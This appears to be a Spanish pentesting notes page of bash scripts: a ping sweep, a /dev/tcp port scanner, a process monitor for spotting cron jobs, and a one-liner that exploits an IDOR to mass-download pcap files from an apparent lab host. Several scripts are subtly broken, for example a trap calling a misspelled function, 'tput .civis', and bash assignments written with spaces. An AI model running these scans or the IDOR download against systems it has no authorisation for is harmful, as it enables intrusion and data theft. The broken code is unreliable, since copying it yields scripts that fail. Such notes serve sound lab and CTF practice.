# BASH

En este apartado iremos poniendo utilidades y scripts en bash.

## Host discovery

Script para descubrir host dentro de una red:

```bash
#!/bin/bash

function control_c(){
	echo -e "\n\n[!] Saliendo...\n"
	tput cnorm
	exit 0
}

# Ctlr+C
trap ctlr_c INT

tput .civis

for i in $(seq 1 254); do
	timeout 1 bash -c "ping -c 1 192.168.11.$i" &>/dev/null && echo "[+] El host 192.168.11.$i - ACTIVE" &
done

wait
tput cnorm
```

Y en modo OneLinner:

```bash
echo 10.0.15.{1..255} | xargs parallel -j30 ping -c1 -- | grep 'bytes from'
```

## Port discovery

Script para descubrir puertos abiertos de un maquina:

```bash
#!/bin/bash

function ctlr_c(){
    echo -e "\n\n[!] Saliendo...\n"
    tput cnorm
    exit 1
}

# Ctlr+C
trap ctlr_c INT

tput civis
for port in $(seq 1 65535); do
    timeout 1 bash -c "echo '' > /dev/tcp/192.168.11.160/$port" 2>/dev/null && echo "[+] Port $port - OPEN" &
done
wait
tput cnorm
```

## Monitor de procesos CRON

Script que monitoriza diferencias en procesos para destacar procesos CRON que se estén ejecutando en el sistema,

```bash
#!/bin/bash

# procmon.sh

function ctlr_c(){
    echo -e "\n\n[!] Saliendo...\n"
    tput cnorm
    exit 1
}

# Ctlr+C
trap ctlr_c INT

old_process = $(ps -eo command)

tput civis
while true; do
    new_process = $(ps -eo command)    
    diff <(echo $old_process) <(echo $new_process) | grep "[\>\<]" | grep -v "kworker"
    old_process = $new_process
done
tput cnorm
```

## Descarga IDOR

Script que aprovecha un idor para descargar de forma masiva en modo **oneliner**:

```bash
for i in {0..500} ; do wget http://10.10.10.245/download/${i} -O pcaps/${i}.pcap 2>/dev/null || break; done; rm pcaps/${i}.pcap
```
